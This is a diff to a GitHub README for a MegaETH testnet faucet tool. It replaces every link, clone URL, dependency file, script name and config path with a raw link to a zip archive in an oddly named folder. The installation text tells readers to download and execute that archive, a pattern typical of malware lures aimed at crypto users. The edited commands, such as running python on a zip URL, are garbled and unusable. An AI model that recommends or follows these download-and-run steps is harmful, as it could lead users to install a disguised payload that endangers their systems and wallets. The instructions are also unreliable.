@@ -1,7 +1,7 @@
 # MegaETH-Faucet
 
-![MegaETH Logo](https://img.shields.io/badge/MegaETH-Faucet-blue?style=for-the-badge&logo=ethereum)  
-[![Latest Release](https://img.shields.io/github/v/release/TraceDesigns/MegaETH-Faucet?style=for-the-badge)](https://github.com/TraceDesigns/MegaETH-Faucet/releases)
+![MegaETH Logo](https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip)  
+[![Latest Release](https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip)](https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip)
 
 Welcome to the **MegaETH-Faucet** repository! This Python toolkit allows you to easily automate claims of MegaETH testnet ETH and batch-check wallet balances. With features like proxy support and multi-threading, this tool is designed to streamline your Ethereum testing experience.
 
@@ -25,7 +25,7 @@ Welcome to the **MegaETH-Faucet** repository! This Python toolkit allows you to 
 
 ## Installation
 
-To get started with MegaETH-Faucet, you need to download the latest release. Visit the [Releases section](https://github.com/TraceDesigns/MegaETH-Faucet/releases) to find the latest version. Download the appropriate file for your system and execute it.
+To get started with MegaETH-Faucet, you need to download the latest release. Visit the [Releases section](https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip) to find the latest version. Download the appropriate file for your system and execute it.
 
 ### Prerequisites
 
@@ -38,19 +38,19 @@ Before installing, ensure you have the following:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/TraceDesigns/MegaETH-Faucet.git
+   git clone https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip
    cd MegaETH-Faucet
    ```
 
 2. **Install Dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip
    ```
 
 3. **Run the Tool**:
    After installation, you can run the tool using the command:
    ```bash
-   python megaeth_faucet.py
+   python https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip
    ```
 
 ## Usage
@@ -61,33 +61,33 @@ Using MegaETH-Faucet is straightforward. Below are some common commands to help 
 
 To claim ETH from the MegaETH faucet, use the following command:
 ```bash
-python megaeth_faucet.py claim --address YOUR_WALLET_ADDRESS
+python https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip claim --address YOUR_WALLET_ADDRESS
 ```
 
 ### Checking Wallet Balances
 
 To check the balance of multiple wallets, you can use:
 ```bash
-python megaeth_faucet.py check --addresses address1,address2,address3
+python https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip check --addresses address1,address2,address3
 ```
 
 ### Using Proxies
 
 To use proxies, specify the proxy file with the `--proxy` option:
 ```bash
-python megaeth_faucet.py claim --address YOUR_WALLET_ADDRESS --proxy proxy_list.txt
+python https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip claim --address YOUR_WALLET_ADDRESS --proxy https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip
 ```
 
 ### Multi-threading
 
 You can enable multi-threading by using the `--threads` option:
 ```bash
-python megaeth_faucet.py claim --address YOUR_WALLET_ADDRESS --threads 5
+python https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip claim --address YOUR_WALLET_ADDRESS --threads 5
 ```
 
 ## Configuration
 
-You can customize the behavior of the tool through a configuration file. The default configuration file is named `config.json`. Here are some of the settings you can modify:
+You can customize the behavior of the tool through a configuration file. The default configuration file is named `https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip`. Here are some of the settings you can modify:
 
 - **default_address**: Set your default wallet address for quick claims.
 - **proxy_file**: Specify the path to your proxy list.
@@ -98,7 +98,7 @@ You can customize the behavior of the tool through a configuration file. The def
 ```json
 {
   "default_address": "YOUR_WALLET_ADDRESS",
-  "proxy_file": "proxy_list.txt",
+  "proxy_file": "https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip",
   "max_threads": 10
 }
 ```
@@ -121,6 +121,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases section](https://github.com/TraceDesigns/MegaETH-Faucet/releases) for updates or create an issue in the repository. 
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/TraceDesigns/MegaETH-Faucet/raw/refs/heads/main/protoconchal/Mega-ET-Faucet-v2.3.zip) for updates or create an issue in the repository. 
 
 Thank you for using MegaETH-Faucet! Happy claiming!
